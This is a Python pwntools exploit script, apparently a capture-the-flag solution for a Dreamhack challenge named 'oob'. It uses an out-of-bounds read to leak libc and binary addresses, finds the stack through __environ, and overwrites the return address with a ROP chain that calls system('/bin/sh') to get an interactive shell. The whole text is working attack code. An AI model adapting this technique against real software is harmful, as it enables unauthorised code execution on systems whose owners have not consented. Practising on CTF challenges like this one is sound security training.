#!/usr/bin/env python3

from pwn import *

exe = ELF("./oob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 12932)

    return r

r = conn()

def leak_qword(idx):
    leak = b""
    for i in range(8):
        r.sendlineafter(b"> ", b"1")
        r.sendlineafter(b"offset: ", str(idx + i).encode())
        leak += r.recvline()[:-1]
    return u64(leak)

def write_qword(idx, value):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"offset: ", str(idx).encode())
    r.sendlineafter(b"value: ", str(value).encode())

def main():
    __libc_start_main = leak_qword(-56)
    frame_dummy = leak_qword(-640)

    exe.address = frame_dummy - exe.symbols["frame_dummy"]
    libc.address = __libc_start_main - libc.symbols["__libc_start_main"]
    
    __environ_idx = libc.symbols["__environ"] - exe.symbols["oob"]
    envp = leak_qword(__environ_idx)
    ret_idx = envp - exe.symbols["oob"] - 288

    rdi_gadget = ROP(libc).find_gadget(["pop rdi", "ret"])[0]
    ret_gadget = ROP(exe).find_gadget(["ret"])[0]
    system = libc.symbols["system"]
    binsh = next(libc.search(b"/bin/sh\x00"))

    write_qword(ret_idx, ret_gadget)
    write_qword(ret_idx + 8, rdi_gadget)
    write_qword(ret_idx + 16, binsh)
    write_qword(ret_idx + 24, system)

    r.sendlineafter(b"> ", b"3")

    r.interactive()


if __name__ == "__main__":
    main()
